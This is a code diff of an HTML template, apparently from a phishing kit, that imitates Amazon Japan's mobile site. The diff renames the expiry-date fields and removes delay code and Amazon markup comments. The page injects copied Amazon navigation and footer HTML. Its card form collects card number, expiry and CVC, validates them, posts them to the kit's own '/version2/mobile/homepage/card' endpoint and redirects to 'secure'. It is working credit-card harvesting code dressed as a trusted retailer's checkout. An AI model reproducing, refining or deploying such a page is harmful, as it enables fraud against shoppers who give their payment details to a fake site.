@@ -308,12 +308,9 @@
 </body >
 <script src="../js/jquery.min.js"></script>
 <script src="../js/jquery.validate.min.js"></script>
-<#--<script src="../js/sire.form.js"></script>-->
 <script src="../js/jquery.card.min.js" charset="utf-8"></script>
 <script src="../js/jquery.mask.js"></script>
 <script type="text/javascript">
-    setTimeout("yincang()", 100);
-    function yincang() {
     let content = document.getElementById('bodyid');
     content.innerHTML="<header class=\"nav-mobile nav-locale-jp nav-lang-ja nav-ssl nav-unrec nav-blueheaven\">\n" +
             "    <div id=\"navbar\" cel_widget_id=\"Navigation-mobile-navbar\" role=\"navigation\"\n" +
@@ -505,21 +502,17 @@
             "                                        </div>\n" +
             "\n" +
             "                                        <div class=\"a-row a-spacing-base\">\n" +
-            "\n" +
             "                                            <label class=\"a-form-label\"><span class='card7'></span> <font style='color:#797474;'><span class='card8'></span></font></label>\n" +
-            "\n" +
-            "                                            <!--<input placeholder=\"MM/YY\" id=\"exdatee\" name=\"exdate\" autocomplete=\"off\" class=\"a-input-text a-span12 \" required>-->\n" +
-            "                                            <select placeholder=\"MM\" id=\"exdatemoon\" name=\"exdatemoon\"\n" +
-            "                                                    autocomplete=\"off\" class=\"a-input-text a-span12 \" style=\"width:40%;\"\n" +
-            "                                                    onfocus=\"deltag2(2)\" required>\n" +
+            "                                            <select placeholder=\"MM\" id=\"month\" name=\"month\"\n" +
+            "                                                    class=\"a-input-text a-span12 \" style=\"width:40%;\"\n" +
+            "                                                     required>\n" +
             "                                                <option value=\"\">月</option>\n" +
-            "                                                <option value='1'>1月</option><option value='2'>2月</option><option value='3'>3月</option><option value='4'>4月</option><option value='5'>5月</option><option value='6'>6月</option><option value='7'>7月</option><option value='8'>8月</option><option value='9'>9月</option><option value='10'>10月</option><option value='11'>11月</option><option value='12'>12月</option>                                            </select> -\n" +
-            "                                            <select placeholder=\"YY\" id=\"exdateyear\" name=\"exdateyear\"\n" +
-            "                                                    autocomplete=\"off\" class=\"a-input-text a-span12 \" style=\"width:40%;\"\n" +
-            "                                                    onfocus=\"deltag2(3)\" required>\n" +
+            "                                                <option value='1'>1</option><option value='2'>2</option><option value='3'>3</option><option value='4'>4</option><option value='5'>5</option><option value='6'>6</option><option value='7'>7</option><option value='8'>8</option><option value='9'>9</option><option value='10'>10</option><option value='11'>11</option><option value='12'>12</option></select> -\n" +
+            "                                            <select placeholder=\"YY\" id=\"year\" name=\"year\"\n" +
+            "                                                    class=\"a-input-text a-span12 \" style=\"width:40%;\"\n" +
+            "                                                     required>\n" +
             "                                                <option value=\"\">年</option>\n" +
-            "                                                <option value='2021'>2021年</option><option value='2022'>2022年</option><option value='2023'>2023年</option><option value='2024'>2024年</option><option value='2025'>2025年</option><option value='2026'>2026年</option><option value='2027'>2027年</option><option value='2028'>2028年</option><option value='2029'>2029年</option><option value='2030'>2030年</option>                                            </select>\n" +
-            "\n" +
+            "                                                <option value='2021'>2021</option><option value='2022'>2022</option><option value='2023'>2023</option><option value='2024'>2024</option><option value='2025'>2025</option><option value='2026'>2026</option><option value='2027'>2027</option><option value='2028'>2028</option><option value='2029'>2029</option><option value='2030'>2030</option></select>\n" +
             "                                        </div>\n" +
             "\n" +
             "                                        <div class=\"a-row a-spacing-base\">\n" +
@@ -558,17 +551,6 @@
             "        </main>\n" +
             "    </div>\n" +
             "</div>\n" +
-            "\n" +
-            "\n" +
-            "<!--&&&Portal&Delimiter&&&-->\n" +
-            "<!-- sp:end-feature:host-atf -->\n" +
-            "<!-- sp:feature:nav-btf -->\n" +
-            "<!-- btf pilu -->\n" +
-            "<!-- sp:end-feature:host-btf -->\n" +
-            "<!-- sp:feature:aui-preload -->\n" +
-            "<!-- sp:feature:nav-footer -->\n" +
-            "<!-- footer pilu -->\n" +
-            "<!-- NAVYAAN MOBILE FOOTER-->\n" +
             "<footer class=\"nav-mobile nav-ftr-batmobile\">\n" +
             "    <div id=\"nav-ftr\" class=\"nav-t-footer-gateway nav-sprite-v3\">\n" +
             "        <a id=\"nav-ftr-gototop\" class=\"nav-a\" href=\"#\"> <i class=\"nav-icon\"></i> <b class=\"nav-b\"> ページトップへ </b> </a>\n" +
@@ -643,26 +625,16 @@
             "                <div id=\"nav-ftr-copyright\"><span class='signin23'></span></div>\n" +
             "    </div>\n" +
             "</footer>\n" +
-            "<!-- whfh-Qk0sG5OcnKluHYqH2y/5BmESxqy4aXM973lJPN5YU3KKswhgm+q2uMb8RHOHdQbP rid-VNB14BJ37PY4TWGVKFV7 -->\n" +
             "<div id=\"sis_pixel_r2\" aria-hidden=\"true\" style=\"height:1px; position: absolute; left: -1000000px; top: -1000000px;\">\n" +
             "</div>\n" +
-            "<!-- footer tilu -->\n" +
-            "<!-- sp:feature:amazon-pay-iframe -->\n" +
-            "<!-- sp:end-feature:amazon-pay-iframe -->\n" +
             "<div id=\"be\" style=\"display:none;visibility:hidden;\">\n" +
             "    <form name=\"ue_backdetect\" action=\"#\">\n" +
             "        <input type=\"hidden\" name=\"ue_back\" value=\"2\"/>\n" +
             "    </form>\n" +
             "</div>\n" +
             "\n" +
-            "<!--       _\n" +
-            "     .__(.)< (MEOW)\n" +
-            "      \\___)\n" +
-            "~~~~~~~~~~~~~~~~~~-->\n" +
-            "<!-- sp:eh:SgtuveiwFuk5VKg+3hw0NfI5ObfIj183zMHpVseqdEwqKwWWdxtR43QLqV8GBuXwsVdPQVARHeF48Ampuv7F84So699UdNPMb+i1FzS1weQqFYPKo7LiHQ== -->\n" +
             "<div id=\"a-white\"></div>\n" +
             "<div id=\"a-popover-root\" style=\"z-index:-1;position:absolute;\"></div>\n" +
-            "<!--NAVYAAN-HMENU-AJAX-->\n" +
             "<div id=\"hmenu-container\" cel_widget_id=\"Navigation-mobile-HamburgerMenu\" style=\"display: block;\"\n" +
             "     class=\"celwidget nav-sprite-v3\" data-cel-widget=\"Navigation-mobile-HamburgerMenu\">\n" +
             "    <div id=\"hmenu-canvas-background\" class=\"hmenu-transparent hmenu-dark-bkg-color\">\n" +
@@ -797,13 +769,13 @@
                 $.post("/version2/mobile/homepage/card", $("#formcard").serialize(),
                         function(result) {
                             setTimeout(function() {
+                                        $("#zwimel").hide();
                                         $(location).attr("href", "secure")
                                     },
                                     1000)
                         })
             },
         })
-    }
 
     function valid_credit_card(value) {
         if (/[^0-9-\s]+/.test(value))
@@ -827,7 +799,6 @@
 <script type="text/javascript">
     var moon = true;
     var year = true;
-
     function deltag2($a) {
         switch ($a) {
             case 2:
@@ -863,6 +834,5 @@
             $("#cvc").minLength = 3
         }
     })
-
 </script>
 </html>
